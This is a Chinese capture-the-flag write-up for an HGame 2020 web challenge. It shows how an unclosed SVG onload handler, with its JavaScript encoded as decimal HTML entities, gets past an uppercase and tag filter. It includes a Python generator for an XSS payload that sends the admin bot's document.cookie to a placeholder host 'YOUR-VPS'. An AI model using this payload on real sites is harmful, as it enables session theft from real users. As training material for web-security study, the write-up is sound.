# Cosmos 的聊天室

## 题目简述

聊天室会把消息转成大写，并过滤 `script`、`iframe` 和完整闭合标签。管理员机器人会查看消息，其 cookie 中保存了后续访问 `/flag` 所需的 token。目标是在这些限制下触发 XSS，把管理员 cookie 发送到自己的服务器。

## 解题过程

过滤器主要匹配成对的闭合标签，因此可以使用无需显式闭合的 SVG 事件属性：

```html
<svg/onload=PAYLOAD
```

页面还会把消息整体转为大写，直接写 JavaScript 会破坏大小写敏感的变量和字符串。将脚本字符编码成十进制 HTML 实体后，浏览器解析属性时会还原原始字符，而过滤器看到的主体只包含数字：

```python
javascript = "window.open('http://YOUR-VPS/'+document.cookie);//"
encoded = "".join(f"&#{ord(ch)};" for ch in javascript)
payload = "<svg/onload=" + encoded
print(payload)
```

末尾的 `//` 用来注释页面可能自动补上的残余字符。管理员访问消息后，浏览器会请求：

```text
http://YOUR-VPS/<管理员 cookie>
```

在服务器访问日志中取出 token，再带着该 token 请求 `/flag` 即可。

Chrome 的旧式 HTML Import 也可构成另一条路径：提交指向外部 HTML 的 `<link rel="import">`，并让外部服务器返回 `Access-Control-Allow-Origin: *`。不过该机制依赖旧版浏览器，实现不如 SVG 事件稳定。

## 方法总结

- 核心技巧：用未闭合 SVG 事件绕过标签黑名单，再用 HTML 数字实体保护 JavaScript 的大小写。
- 识别信号：输入经过大写转换并不等于无法执行脚本；浏览器在 HTML 实体解码后才解释事件属性。
- 复用要点：XSS payload 要按“服务端变换后的最终 DOM”验证，外带目标应只包含必要数据，并在比赛结束后关闭接收端。

> 外部复现资料补足了原 PDF 中未展开的实体编码构造；正文已完整保留其机制。参考：[HGame 2020 Web 题解](https://blog.wh1sper.com/posts/hgame2020_web/)。
